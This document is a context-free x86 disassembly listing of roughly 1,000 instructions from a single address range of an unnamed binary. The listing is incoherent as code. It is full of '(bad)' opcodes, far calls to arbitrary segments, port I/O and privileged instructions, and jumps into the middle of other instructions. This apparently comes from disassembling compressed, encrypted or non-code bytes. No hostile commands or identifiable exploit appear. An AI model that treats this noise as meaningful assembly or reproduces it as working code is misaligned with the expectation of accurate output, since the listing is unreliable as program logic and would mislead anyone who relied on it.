  41dabe:	mov    cl,0xd2
  41dac0:	or     BYTE PTR [ecx-0x6],dl
  41dac3:	xchg   esi,eax
  41dac4:	cmp    BYTE PTR [eax+0x72],dh
  41dac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dac8:	push   edx
  41dac9:	outs   dx,DWORD PTR ds:[esi]
  41daca:	daa    
  41dacb:	mov    eax,0xfdc94292
  41dad0:	sub    BYTE PTR [ebx],cl
  41dad2:	xchg   BYTE PTR [edx+edx*8+0x1dc2364d],dl
  41dad9:	mov    eax,0x424c6d4c
  41dade:	dec    edi
  41dadf:	add    BYTE PTR [esi+0x20115d7a],cl
  41dae5:	es cdq 
  41dae7:	loope  0x41db08
  41dae9:	mov    esi,0x787929a6
  41daee:	(bad)  [esi]
  41daf0:	ficom  WORD PTR [ecx+0x6f]
  41daf3:	add    DWORD PTR [esi+ebx*8],0x4f
  41daf7:	es mov ah,0x47
  41dafa:	int3   
  41dafb:	loopne 0x41dacf
  41dafd:	add    BYTE PTR es:[edi-0x3f],bl
  41db01:	xchg   ebp,eax
  41db02:	loope  0x41dae7
  41db04:	push   ds
  41db05:	xor    dh,dh
  41db07:	loopne 0x41db53
  41db09:	dec    edx
  41db0a:	(bad)  
  41db0b:	test   eax,0xfee745ef
  41db10:	mov    edx,0xa6f786fa
  41db15:	lock mov dl,0x86
  41db18:	aad    0x6b
  41db1a:	inc    ecx
  41db1b:	mov    eax,0x26d027cd
  41db20:	mov    bl,0xd8
  41db22:	pop    esp
  41db23:	or     al,BYTE PTR [edi-0x71]
  41db26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db27:	add    dl,bl
  41db29:	inc    eax
  41db2a:	pop    edi
  41db2b:	bound  edx,QWORD PTR [ebx+0x76]
  41db2e:	add    DWORD PTR [eax+0x3af6dd1b],edx
  41db34:	add    eax,esp
  41db36:	xor    eax,0x3fe717b4
  41db3b:	xchg   esi,eax
  41db3c:	mov    ds:0xee86185a,al
  41db41:	xor    BYTE PTR [ebx-0x47a81209],bh
  41db47:	lahf   
  41db48:	xor    al,0x57
  41db4a:	call   0x7735:0x6a4b49c3
  41db51:	loop   0x41daff
  41db53:	xchg   ebx,eax
  41db54:	xchg   esp,eax
  41db55:	mov    ?,WORD PTR [eax]
  41db57:	sbb    al,0x94
  41db59:	lods   al,BYTE PTR ds:[esi]
  41db5a:	mov    ebx,0xe074de4b
  41db5f:	out    dx,eax
  41db60:	jmp    0x41dbab
  41db62:	pop    ebx
  41db63:	xchg   ebx,eax
  41db64:	fld    st(3)
  41db66:	adc    al,0x95
  41db68:	xlat   BYTE PTR ds:[ebx]
  41db69:	ins    BYTE PTR es:[edi],dx
  41db6a:	les    edi,FWORD PTR [edi+eax*4+0x6b]
  41db6e:	dec    edx
  41db6f:	test   eax,ebp
  41db71:	js     0x41db3b
  41db73:	fld    QWORD PTR [ebp+0x30888539]
  41db79:	test   cl,cl
  41db7b:	out    0x17,eax
  41db7d:	and    esp,ebp
  41db7f:	push   eax
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	call   0xeab1525e
  41db86:	sub    ebp,DWORD PTR [ebx-0x29120b0f]
  41db8c:	out    0x5e,al
  41db8e:	gs mov ch,0xad
  41db91:	jb     0x41dc0f
  41db93:	inc    edx
  41db94:	lfs    ecx,FWORD PTR [eax-0x50]
  41db98:	pusha  
  41db99:	jns    0x41dbc1
  41db9b:	pop    esi
  41db9c:	popa   
  41db9d:	inc    eax
  41db9e:	cmp    al,0xdc
  41dba0:	xchg   ebp,eax
  41dba1:	loope  0x41dba4
  41dba3:	stos   DWORD PTR es:[edi],eax
  41dba4:	or     al,0xa0
  41dba6:	inc    ecx
  41dba7:	imul   eax,DWORD PTR [esi+edx*1-0x8],0xffffff95
  41dbac:	and    DWORD PTR [eax-0x2263e956],esp
  41dbb2:	cwde   
  41dbb3:	xor    dl,ah
  41dbb5:	rol    esp,0x3b
  41dbb8:	dec    edx
  41dbb9:	jl     0x41dbbb
  41dbbb:	sbb    eax,0x835ef3b1
  41dbc0:	push   cs
  41dbc1:	scas   eax,DWORD PTR es:[edi]
  41dbc2:	jmp    0x41dc32
  41dbc4:	sbb    DWORD PTR [esi+0x32],esp
  41dbc7:	loop   0x41db8a
  41dbc9:	es mov edi,0x65600cf3
  41dbcf:	pop    edi
  41dbd0:	push   ebp
  41dbd1:	call   0x905f:0xcbe34b60
  41dbd8:	cs jb  0x41dbf6
  41dbdb:	adc    ah,BYTE PTR [ebx-0x4b]
  41dbde:	fst    QWORD PTR [ecx-0x56856f30]
  41dbe4:	cmp    ah,cl
  41dbe6:	jg     0x41dbb7
  41dbe8:	ins    DWORD PTR es:[edi],dx
  41dbe9:	shl    DWORD PTR [esi],1
  41dbeb:	mov    ebx,0x711a0532
  41dbf0:	jo     0x41dbb8
  41dbf2:	xor    al,0xdb
  41dbf4:	ror    DWORD PTR [ebx],1
  41dbf6:	mov    esp,0x6b021f7b
  41dbfb:	cmp    dh,BYTE PTR [ebx+ecx*1-0xf777e52]
  41dc02:	cmp    DWORD PTR [ebx-0x5b],eax
  41dc05:	push   ds
  41dc06:	gs fwait
  41dc08:	xchg   edi,eax
  41dc09:	push   ds
  41dc0a:	inc    eax
  41dc0b:	ds mov ah,0xeb
  41dc0e:	xor    eax,0x4ee1d253
  41dc13:	push   esp
  41dc14:	fsubr  QWORD PTR [edx-0x25a83ec2]
  41dc1a:	cmp    eax,0x618ecb30
  41dc1f:	hlt    
  41dc20:	inc    edi
  41dc21:	mov    ebp,0x72b80d56
  41dc26:	add    al,0xbf
  41dc28:	jnp    0x41dc69
  41dc2a:	cmp    ebx,edi
  41dc2c:	in     al,dx
  41dc2d:	in     al,dx
  41dc2e:	call   0x5c34:0x6b3522f1
  41dc35:	imul   ecx,DWORD PTR [edx-0x34ad85ff],0xc
  41dc3c:	push   edx
  41dc3d:	jo     0x41dc1e
  41dc3f:	ins    DWORD PTR es:[edi],dx
  41dc40:	hlt    
  41dc41:	push   ds
  41dc42:	test   DWORD PTR [edx+0x58284bed],ecx
  41dc48:	sbb    al,0xdc
  41dc4a:	cli    
  41dc4b:	and    al,0x1a
  41dc4d:	icebp  
  41dc4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc4f:	sub    BYTE PTR [edi-0x773dfabe],bh
  41dc55:	ins    DWORD PTR es:[edi],dx
  41dc56:	or     eax,0x5f0835fa
  41dc5b:	push   0x21bed7da
  41dc60:	cmp    bh,BYTE PTR [edi+esi*1-0x22375d19]
  41dc67:	add    DWORD PTR [edi],edx
  41dc69:	(bad)  
  41dc6a:	out    dx,al
  41dc6b:	sub    DWORD PTR [ebp+0x4f],eax
  41dc6e:	or     DWORD PTR [edx],0xf422d8c6
  41dc74:	sub    eax,0x3bcfd178
  41dc79:	or     al,0x21
  41dc7b:	or     ch,BYTE PTR [esi+0x5a35dd93]
  41dc81:	sub    BYTE PTR [ebx+edx*4+0x64],al
  41dc85:	xor    eax,0xe3e07303
  41dc8a:	call   0x98d:0x3002640a
  41dc91:	inc    esi
  41dc92:	je     0x41dc69
  41dc94:	(bad)  
  41dc95:	in     eax,dx
  41dc96:	mov    ecx,0xdb47d163
  41dc9b:	iret   
  41dc9c:	(bad)  
  41dc9d:	mov    ebx,fs
  41dc9f:	pop    ebx
  41dca0:	scas   eax,DWORD PTR es:[edi]
  41dca1:	fwait
  41dca2:	dec    edi
  41dca3:	sbb    bl,BYTE PTR [ecx+ecx*2-0x1e]
  41dca7:	pusha  
  41dca8:	jae    0x41dcee
  41dcaa:	aad    0x1b
  41dcac:	js     0x41dc36
  41dcae:	mov    al,0x2c
  41dcb0:	pusha  
  41dcb1:	inc    ecx
  41dcb2:	xor    BYTE PTR ds:0xeec6c985,bh
  41dcb8:	mov    bl,BYTE PTR [esp+edi*2]
  41dcbb:	cmp    BYTE PTR [edi],ch
  41dcbd:	ins    BYTE PTR es:[edi],dx
  41dcbe:	or     al,0xcc
  41dcc0:	push   ss
  41dcc1:	mov    eax,DWORD PTR [esi+0x38]
  41dcc4:	sbb    DWORD PTR [edi+edx*1+0x32761c0],ebp
  41dccb:	aas    
  41dccc:	(bad)  
  41dccd:	jl     0x41dcbd
  41dccf:	enter  0xddab,0xce
  41dcd3:	and    al,cl
  41dcd5:	ret    
  41dcd6:	call   0x3f8b:0x62befc4e
  41dcdd:	add    al,0xfb
  41dcdf:	dec    ecx
  41dce0:	icebp  
  41dce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dce2:	cmp    eax,0xdd78e1f9
  41dce7:	push   edi
  41dce8:	std    
  41dce9:	mov    bl,0x87
  41dceb:	mov    al,ds:0xf1df3028
  41dcf0:	inc    ebp
  41dcf1:	push   ebp
  41dcf2:	call   0x3215:0x67b88868
  41dcf9:	cmp    BYTE PTR [bx+di],0xbd
  41dcfd:	push   esp
  41dcfe:	jp     0x41dd1c
  41dd00:	dec    eax
  41dd01:	mov    edx,0x871b3029
  41dd06:	mov    ds:0x242052c8,eax
  41dd0b:	cmp    eax,0xe746eaa5
  41dd10:	mov    ah,0xb3
  41dd12:	std    
  41dd13:	mov    dh,0x92
  41dd15:	inc    ecx
  41dd16:	cs jg  0x41dd72
  41dd19:	stc    
  41dd1a:	popa   
  41dd1b:	jmp    DWORD PTR [ebx]
  41dd1d:	(bad)  
  41dd1e:	pop    ebp
  41dd1f:	test   DWORD PTR [ebx+ebp*2+0x3f],esp
  41dd23:	push   ebp
  41dd24:	(bad)  
  41dd25:	shl    BYTE PTR [ecx+0x52a83f5b],cl
  41dd2b:	add    al,0xd6
  41dd2d:	hlt    
  41dd2e:	test   eax,0x44b3abba
  41dd33:	lea    edi,[esi]
  41dd35:	loopne 0x41dcf5
  41dd37:	push   ds
  41dd38:	aaa    
  41dd39:	cld    
  41dd3a:	js     0x41dd0b
  41dd3c:	mov    ebp,0x8786e8b6
  41dd41:	xor    dl,BYTE PTR [esi-0x73]
  41dd44:	aad    0x26
  41dd46:	adc    al,0x3b
  41dd48:	cmp    BYTE PTR [eax-0x28],ah
  41dd4b:	loope  0x41dd76
  41dd4d:	es jno 0x41dcf8
  41dd50:	xsave  [ebx-0x337d7a51]
  41dd57:	jg     0x41dce6
  41dd59:	and    bh,dl
  41dd5b:	adc    BYTE PTR [edi+edx*8-0x74],ah
  41dd5f:	mov    al,ds:0x48b225a
  41dd64:	cmp    DWORD PTR [edx+0x75],ebp
  41dd67:	out    dx,eax
  41dd68:	cld    
  41dd69:	lea    ebp,[eax-0x1a]
  41dd6c:	adc    BYTE PTR [ebx-0xeccb485],0xba
  41dd73:	or     DWORD PTR [esi-0x283289a2],ecx
  41dd79:	sbb    dl,BYTE PTR [ecx+ebx*8]
  41dd7c:	ins    DWORD PTR es:[edi],dx
  41dd7d:	mov    ah,0xa2
  41dd7f:	dec    ecx
  41dd80:	jns    0x41dd24
  41dd82:	xor    DWORD PTR [edx-0x7ec6a553],ebp
  41dd88:	imul   ebp,DWORD PTR [ecx+0x18],0xf554713a
  41dd8f:	fistp  QWORD PTR [eax-0x34]
  41dd92:	xor    al,0x6c
  41dd94:	sub    eax,0x1482cdaa
  41dd99:	add    edx,DWORD PTR [ebp+ebx*4-0x45da2d3]
  41dda0:	rcr    DWORD PTR [edi+0x28a6c08e],1
  41dda6:	lds    ebx,FWORD PTR [ecx+eax*2-0x6a]
  41ddaa:	outs   dx,DWORD PTR ds:[esi]
  41ddab:	push   ss
  41ddac:	pop    eax
  41ddad:	repnz or al,0xc0
  41ddb0:	lods   al,BYTE PTR ds:[esi]
  41ddb1:	cmp    BYTE PTR [edx],bh
  41ddb3:	repnz fbstp TBYTE PTR [esi+0x7bed2531]
  41ddba:	inc    esi
  41ddbb:	mov    dh,BYTE PTR [eax]
  41ddbd:	dec    eax
  41ddbe:	ret    0x323e
  41ddc1:	je     0x41ddc6
  41ddc3:	and    BYTE PTR [esi+0x56ab273c],cl
  41ddc9:	(bad)  
  41ddca:	lds    edx,FWORD PTR [ebp-0x77]
  41ddcd:	mov    al,bl
  41ddcf:	adc    BYTE PTR [ebp-0x50fba52],bh
  41ddd5:	cmc    
  41ddd6:	in     eax,0x8a
  41ddd8:	rol    DWORD PTR [ecx],cl
  41ddda:	mov    eax,0x72ed8cea
  41dddf:	leave  
  41dde0:	add    eax,0xd355ae9
  41dde5:	fcom   QWORD PTR [eax]
  41dde7:	sahf   
  41dde8:	adc    esp,0xd
  41ddeb:	mov    ebp,0x412d04a2
  41ddf0:	shl    BYTE PTR ds:0x8c36ce2f,cl
  41ddf6:	fs adc cl,al
  41ddf9:	into   
  41ddfa:	push   0x4761d382
  41ddff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de00:	and    eax,0x5a83872d
  41de05:	daa    
  41de06:	retf   
  41de07:	pushf  
  41de08:	call   0x8e71:0xcb0859ba
  41de0f:	jmp    0x41dda1
  41de11:	xor    BYTE PTR [edx+eax*8-0x5d],0xb3
  41de16:	or     bl,bh
  41de18:	lds    ebx,FWORD PTR [ebx+0x5]
  41de1b:	adc    ebx,0x20dbacab
  41de21:	scas   eax,DWORD PTR es:[edi]
  41de22:	jno    0x41ddef
  41de24:	push   0xe125645a
  41de29:	repz fsub DWORD PTR [ebp-0x48de4654]
  41de30:	push   ecx
  41de31:	pop    eax
  41de32:	test   eax,0xe50e0db0
  41de37:	dec    edi
  41de38:	pop    ebx
  41de39:	adc    edx,DWORD PTR [esp+edx*8-0x9]
  41de3d:	clc    
  41de3e:	int    0x16
  41de40:	add    al,0x18
  41de42:	pop    eax
  41de43:	push   cs
  41de44:	dec    ecx
  41de45:	addr16 jp 0x41de96
  41de48:	scas   eax,DWORD PTR es:[edi]
  41de49:	popa   
  41de4a:	add    DWORD PTR cs:[ecx],esp
  41de4d:	push   ebp
  41de4e:	xchg   ecx,eax
  41de4f:	jae    0x41de73
  41de51:	fstp   TBYTE PTR [ebp-0x40]
  41de54:	dec    edi
  41de55:	or     BYTE PTR [ebx+0x30],cl
  41de58:	lds    edi,FWORD PTR [ecx+0x107a7341]
  41de5e:	mov    gs,ecx
  41de60:	sub    DWORD PTR [esp+edi*4],ecx
  41de63:	add    DWORD PTR [edi],eax
  41de65:	test   DWORD PTR [esp+ecx*1],edx
  41de68:	pop    es
  41de69:	clc    
  41de6a:	push   0x2a859672
  41de6f:	lds    edx,FWORD PTR [esi+0x618e9f73]
  41de75:	sbb    ah,BYTE PTR [ebx-0x75]
  41de78:	pop    eax
  41de79:	(bad)  
  41de7a:	sub    bh,BYTE PTR [edx-0x68]
  41de7d:	xchg   edi,eax
  41de7e:	xor    esp,eax
  41de80:	sbb    DWORD PTR [edi-0x45399b44],edi
  41de86:	dec    edx
  41de87:	lods   al,BYTE PTR ds:[esi]
  41de88:	fild   QWORD PTR [ebx]
  41de8a:	xor    edx,ebp
  41de8c:	dec    ebx
  41de8d:	adc    al,0xfa
  41de8f:	push   ecx
  41de90:	enter  0xa201,0xee
  41de94:	out    dx,eax
  41de95:	xchg   edx,eax
  41de96:	and    dh,BYTE PTR [ebx-0x4bf744f0]
  41de9c:	ret    
  41de9d:	call   edi
  41de9f:	scas   al,BYTE PTR es:[edi]
  41dea0:	adc    edi,ebp
  41dea2:	sub    DWORD PTR [edi+0x13],esi
  41dea5:	adc    al,0xac
  41dea7:	shl    BYTE PTR [edx],cl
  41dea9:	std    
  41deaa:	push   0xffffffff
  41deac:	sbb    al,0xec
  41deae:	gs or  eax,0x1ef9ad34
  41deb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deb5:	(bad)  
  41deb6:	mov    esi,tr1
  41deb9:	sbb    BYTE PTR [ebx-0x20bc37df],dh
  41debf:	mov    edi,edx
  41dec1:	add    eax,0x5613256c
  41dec6:	and    BYTE PTR [edi+0x1818690e],0xed
  41decd:	jne    0x41df17
  41decf:	(bad)  
  41ded0:	mov    eax,0xd849ed8e
  41ded5:	and    bh,BYTE PTR [edx-0x15]
  41ded8:	pop    ss
  41ded9:	adc    DWORD PTR [esi-0x41148e97],ebp
  41dedf:	dec    eax
  41dee0:	or     esi,DWORD PTR [eax+0x77]
  41dee3:	cbw    
  41dee5:	pop    esi
  41dee6:	repnz dec edx
  41dee8:	pop    esi
  41dee9:	pop    ebp
  41deea:	mov    ch,0x1a
  41deec:	xlat   BYTE PTR ds:[ebx]
  41deed:	je     0x41df66
  41deef:	or     esi,edx
  41def1:	dec    ebx
  41def2:	pusha  
  41def3:	sar    ah,1
  41def5:	retf   0xdf5a
  41def8:	arpl   WORD PTR [edi+0x58],bx
  41defb:	into   
  41defc:	jg     0x41deea
  41defe:	inc    ebp
  41deff:	jne    0x41df4a
  41df01:	bound  ebp,QWORD PTR [edx-0x2e9d0cb3]
  41df07:	and    eax,0x9a62fd9c
  41df0c:	pop    esp
  41df0d:	mov    DWORD PTR [esi],ebp
  41df0f:	xchg   esp,eax
  41df10:	cmp    BYTE PTR [ebx-0x52b2c578],dl
  41df16:	call   0x84f8:0x5b1e0854
  41df1d:	aam    0x12
  41df1f:	popf   
  41df20:	daa    
  41df21:	imul   BYTE PTR [edx]
  41df23:	xchg   esi,eax
  41df24:	jge    0x41dee3
  41df26:	sbb    al,0xe1
  41df28:	(bad)  
  41df29:	xor    dl,BYTE PTR [esi+0x11]
  41df2c:	clc    
  41df2d:	cmp    eax,0x2a0e1d1c
  41df32:	sub    al,0xbc
  41df34:	repz mov eax,0x92cf4292
  41df3a:	ss jmp 0x41df3a
  41df3d:	xor    cl,BYTE PTR [ebp-0x61f7cf30]
  41df43:	in     al,dx
  41df44:	fisttp QWORD PTR [edi]
  41df46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df47:	mov    ds:0x54ad3be,eax
  41df4c:	mov    edx,0x304fb052
  41df51:	pop    ss
  41df52:	cld    
  41df53:	inc    ebp
  41df54:	les    esp,FWORD PTR [esp+ebx*4-0x1d147d8]
  41df5b:	push   0x64
  41df5d:	xor    ecx,0xe37e38a8
  41df63:	popa   
  41df64:	sbb    eax,0x6b5faabf
  41df69:	leave  
  41df6a:	test   eax,0xfff96723
  41df6f:	inc    eax
  41df70:	jle    0x41df23
  41df72:	cli    
  41df73:	adc    ebp,DWORD PTR [ecx]
  41df75:	lods   eax,DWORD PTR ds:[esi]
  41df76:	inc    ecx
  41df77:	jg     0x41df68
  41df79:	pushf  
  41df7a:	rol    BYTE PTR [edx-0x187c6b41],cl
  41df80:	retf   0x4e81
  41df83:	xchg   esi,eax
  41df84:	pop    esp
  41df85:	jmp    0x41df72
  41df87:	add    cl,BYTE PTR ds:0x4c2ac158
  41df8d:	mov    BYTE PTR [eax+esi*1],0x2d
  41df91:	test   BYTE PTR [edx],ah
  41df93:	push   ds
  41df94:	mov    ecx,0x2d768de9
  41df99:	ror    DWORD PTR [ebp+0x46],0x10
  41df9d:	dec    esi
  41df9e:	xchg   ebx,eax
  41df9f:	jl     0x41dfae
  41dfa1:	sbb    cl,BYTE PTR [ebp-0x4d]
  41dfa4:	sbb    dl,BYTE PTR [esp+edx*4]
  41dfa7:	into   
  41dfa8:	aam    0x46
  41dfaa:	ins    BYTE PTR es:[edi],dx
  41dfab:	sbb    eax,0x578f28c0
  41dfb0:	fcom   QWORD PTR [ecx+edx*4-0x16]
  41dfb4:	nop
  41dfb5:	fucomi st,st(4)
  41dfb7:	jb     0x41e038
  41dfb9:	jge    0x41dfe3
  41dfbb:	clc    
  41dfbc:	mov    ah,0xf4
  41dfbe:	div    BYTE PTR [edx-0x7ba5cd8a]
  41dfc4:	jmp    0xae15f171
  41dfc9:	mov    cl,0x8a
  41dfcb:	jnp    0x41df8f
  41dfcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfce:	jecxz  0x41dfc0
  41dfd0:	cmp    BYTE PTR [ecx-0x3d04a206],bh
  41dfd6:	lock sahf 
  41dfd8:	mov    ecx,0x8bd14b47
  41dfdd:	pop    ds
  41dfde:	imul   esp,DWORD PTR [ecx],0x3c3b68a6
  41dfe4:	xor    al,0x38
  41dfe6:	mov    dl,0x7b
  41dfe8:	call   0x12a3:0xbfe7dc87
  41dfef:	jp     0x41e01f
  41dff1:	mov    al,ds:0x2c66af5b
  41dff6:	dec    eax
  41dff7:	mov    ebp,DWORD PTR [esi-0x27]
  41dffa:	mov    dh,0xab
  41dffc:	test   BYTE PTR [edi-0x6e15424e],bh
  41e002:	xor    eax,0xb4ebd099
  41e007:	xor    BYTE PTR [ebp-0x56],bh
  41e00a:	sbb    al,0x28
  41e00c:	pop    eax
  41e00d:	mov    dh,0x14
  41e00f:	loopne 0x41dff2
  41e011:	btc    DWORD PTR [edx+esi*2],ebp
  41e015:	in     al,dx
  41e016:	dec    esp
  41e017:	arpl   WORD PTR [eax+0x2b],cx
  41e01a:	sbb    al,0x84
  41e01c:	aam    0x41
  41e01e:	ss xchg ebx,eax
  41e020:	bound  eax,QWORD PTR [edi]
  41e022:	js     0x41e09d
  41e024:	loopne 0x41dfac
  41e026:	adc    eax,0xbc7b62d3
  41e02b:	xor    eax,0xf274a99d
  41e030:	icebp  
  41e031:	div    BYTE PTR [ecx+ebx*4-0x6a]
  41e035:	dec    ebp
  41e036:	ror    DWORD PTR [edx],0xd0
  41e039:	fistp  DWORD PTR [eax+0x5f5c4982]
  41e03f:	sub    DWORD PTR [ebp-0x73],0xe44c4006
  41e046:	data16 aad 0xe0
  41e049:	cdq    
  41e04a:	jle    0x41e03f
  41e04c:	and    DWORD PTR [ecx-0x6e3a3879],0x16f45619
  41e056:	imul   eax,DWORD PTR [esp+edx*4+0x2d],0x9aca94a5
  41e05e:	jb     0x41e08a
  41e060:	(bad)  
  41e061:	mov    al,ds:0x36436b96
  41e066:	js     0x41dffa
  41e068:	dec    DWORD PTR [edi]
  41e06a:	mov    bl,BYTE PTR [eax-0x37]
  41e06d:	shl    eax,cl
  41e06f:	sbb    eax,0xd84db6e4
  41e074:	mov    dh,0x16
  41e076:	mov    ebx,0x532d8539
  41e07b:	jl     0x41e083
  41e07d:	fs in  al,dx
  41e07f:	(bad)  [ecx-0x44708c23]
  41e085:	inc    ebx
  41e086:	fmul   QWORD PTR [ecx+eiz*4]
  41e089:	mov    dh,0x23
  41e08b:	jne    0x41e0b9
  41e08d:	jl     0x41e101
  41e08f:	ja     0x41e0df
  41e091:	test   bl,0x25
  41e094:	into   
  41e095:	mov    WORD PTR [eax+0x5da1b3b9],?
  41e09b:	mov    eax,0xfff2078d
  41e0a0:	sti    
  41e0a1:	jnp    0x41e103
  41e0a3:	out    dx,al
  41e0a4:	mov    al,BYTE PTR [ebx-0x561eae7f]
  41e0aa:	in     eax,0x78
  41e0ac:	retf   0x1b94
  41e0af:	inc    ecx
  41e0b0:	lock and DWORD PTR [eax+eiz*4-0x65],eax
  41e0b5:	rcl    ebp,1
  41e0b7:	dec    esp
  41e0b8:	sbb    ch,cl
  41e0ba:	(bad)  
  41e0bb:	dec    ebx
  41e0bc:	sbb    BYTE PTR [ecx-0x1a],bl
  41e0bf:	out    dx,eax
  41e0c0:	(bad)  
  41e0c1:	sub    DWORD PTR [ebp+eiz*2-0x7d],ebx
  41e0c5:	jnp    0x41e0e5
  41e0c7:	mov    edi,0x68aab152
  41e0cc:	and    al,0x2
  41e0ce:	aad    0xcb
  41e0d0:	cmp    BYTE PTR [edi+0x7e],dh
  41e0d3:	(bad)  
  41e0d4:	fwait
  41e0d5:	mov    ds:0xacb0648b,al
  41e0da:	sbb    DWORD PTR [eax+0x2],0xffffffc2
  41e0de:	cli    
  41e0df:	add    bl,al
  41e0e1:	sub    al,0xf
  41e0e3:	sbb    al,0x18
  41e0e5:	or     al,0x48
  41e0e7:	push   esp
  41e0e8:	loop   0x41e13b
  41e0ea:	pop    DWORD PTR [esi]
  41e0ec:	cmp    al,0xfc
  41e0ee:	cmp    eax,0xac8fccf1
  41e0f3:	(bad)  
  41e0f4:	es dec esi
  41e0f6:	ret    0x773c
  41e0f9:	and    eax,DWORD PTR [ebx]
  41e0fb:	gs cdq 
  41e0fd:	sub    BYTE PTR [ebx],al
  41e0ff:	dec    eax
  41e100:	jmp    0x518f:0xab094c44
  41e107:	icebp  
  41e108:	retf   
  41e109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e10a:	push   cs
  41e10b:	mov    edx,0xde029b5
  41e110:	and    ah,ah
  41e112:	scas   eax,DWORD PTR es:[edi]
  41e113:	push   esi
  41e114:	cwde   
  41e115:	and    eax,0x854d2448
  41e11a:	adc    edi,edx
  41e11c:	sbb    eax,0x77e25c68
  41e121:	(bad)  [edx-0x17938db]
  41e127:	jl     0x41e105
  41e129:	je     0x41e0f7
  41e12b:	(bad)  
  41e12c:	addr16 push ebx
  41e12e:	leave  
  41e12f:	sar    edx,0x33
  41e132:	or     dh,ah
  41e134:	aaa    
  41e135:	mov    ebp,0x17c4f32c
  41e13a:	not    BYTE PTR [esi]
  41e13c:	push   0x45
  41e13e:	out    0x27,al
  41e140:	add    al,0x32
  41e142:	fcmovnbe st,st(0)
  41e144:	push   esp
  41e145:	fs push ds
  41e147:	mov    WORD PTR [ecx],gs
  41e149:	repnz fwait
  41e14b:	push   eax
  41e14c:	das    
  41e14d:	clc    
  41e14e:	popf   
  41e14f:	sub    eax,0xbf2fb412
  41e154:	out    dx,eax
  41e155:	mov    ?,WORD PTR [edi]
  41e157:	retf   
  41e158:	xor    BYTE PTR ds:0xcc981a66,bl
  41e15e:	adc    DWORD PTR [esi+0x66c42bdd],0xffffff91
  41e165:	add    BYTE PTR [edx+0x22ae8f3b],0xda
  41e16c:	mov    ds:0x2d676d99,eax
  41e171:	add    al,0xb9
  41e173:	(bad)  
  41e174:	mov    dh,BYTE PTR [edx-0x1e3ac200]
  41e17a:	sbb    al,0x55
  41e17c:	std    
  41e17d:	ins    BYTE PTR es:[edi],dx
  41e17e:	inc    ecx
  41e17f:	mov    DWORD PTR [ecx+esi*8],ebx
  41e182:	add    cl,BYTE PTR [edi+0x3a]
  41e185:	xor    DWORD PTR [ecx+eiz*1-0x1],esp
  41e189:	adc    eax,0x187de091
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	push   edx
  41e190:	mov    al,ds:0xe70e44f9
  41e195:	(bad)  
  41e196:	sti    
  41e197:	jecxz  0x41e138
  41e199:	mov    ebx,0x18e47da5
  41e19e:	sahf   
  41e19f:	int3   
  41e1a0:	mov    ds:0xd1643353,al
  41e1a5:	ss jbe 0x41e227
  41e1a8:	jnp    0x41e157
  41e1aa:	xor    al,BYTE PTR [ebp-0x5337d1cb]
  41e1b0:	add    DWORD PTR [esi+ecx*1],esp
  41e1b3:	jno    0x41e1c2
  41e1b5:	add    al,0xcd
  41e1b7:	mov    ah,0x56
  41e1b9:	gs retf 0x5943
  41e1bd:	push   es
  41e1be:	push   es
  41e1bf:	(bad)  
  41e1c0:	fdivr  st,st(4)
  41e1c2:	and    ebp,DWORD PTR [ebp+0x1d]
  41e1c5:	shr    DWORD PTR ds:0xcaac0bc4,0xeb
  41e1cc:	repz mov ah,0x3a
  41e1cf:	dec    esi
  41e1d0:	mov    dh,0xcf
  41e1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1d3:	mov    ch,0xe1
  41e1d5:	ins    BYTE PTR es:[edi],dx
  41e1d6:	es js  0x41e22b
  41e1d9:	adc    eax,0x7cfe2083
  41e1de:	add    DWORD PTR ds:0xc20498e5,edx
  41e1e4:	mov    bl,0xb2
  41e1e6:	push   es
  41e1e7:	adc    eax,0x7ac3c882
  41e1ec:	inc    edi
  41e1ed:	(bad)  
  41e1ee:	lods   al,BYTE PTR ds:[esi]
  41e1ef:	pop    ss
  41e1f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f1:	test   bh,bl
  41e1f3:	imul   edi,DWORD PTR [esi],0x142c6688
  41e1f9:	rcl    DWORD PTR [eax],0x3e
  41e1fc:	mov    ah,0x1a
  41e1fe:	jmp    0x41e1cb
  41e200:	pop    ds
  41e201:	dec    edi
  41e202:	lds    edi,FWORD PTR [ebp+0x51]
  41e205:	in     al,0x62
  41e207:	push   0xc32a5bc3
  41e20c:	imul   edx,DWORD PTR [eax],0xe98120a5
  41e212:	xor    DWORD PTR [eax-0x3eea17b3],edi
  41e218:	push   edi
  41e219:	jmp    0x41e235
  41e21b:	adc    esi,edi
  41e21d:	and    eax,0x7d1a4af9
  41e222:	xor    al,0xb9
  41e224:	mov    cl,0xc3
  41e226:	adc    ebp,eax
  41e228:	xor    ebp,eax
  41e22a:	dec    esp
  41e22b:	sub    DWORD PTR [edx+edx*8],edx
  41e22e:	out    dx,al
  41e22f:	outs   dx,DWORD PTR ds:[esi]
  41e230:	mov    ds:0x97451032,al
  41e235:	js     0x41e266
  41e237:	daa    
  41e238:	lock popa 
  41e23a:	(bad)  
  41e23b:	mov    eax,ds:0xeff1487f
  41e240:	repnz mov ds,WORD PTR [ebp+0xe]
  41e244:	in     eax,0x73
  41e246:	pop    esi
  41e247:	popf   
  41e248:	bnd jg 0x41e241
  41e24b:	sar    BYTE PTR [ebx+0x31475edc],1
  41e251:	idiv   ch
  41e253:	or     al,0x4
  41e255:	sbb    ebp,ecx
  41e257:	jmp    0xbdb36b24
  41e25c:	or     BYTE PTR [ebp+0x313b02ec],al
  41e262:	xor    DWORD PTR ds:0x9412937,0x62
  41e269:	(bad)  
  41e26a:	fbstp  TBYTE PTR [edx+0x1d8c2229]
  41e270:	sahf   
  41e271:	sub    BYTE PTR [ecx],dl
  41e273:	aaa    
  41e274:	push   ebp
  41e275:	out    0xd8,eax
  41e277:	into   
  41e278:	xor    eax,DWORD PTR [edi]
  41e27a:	dec    ebp
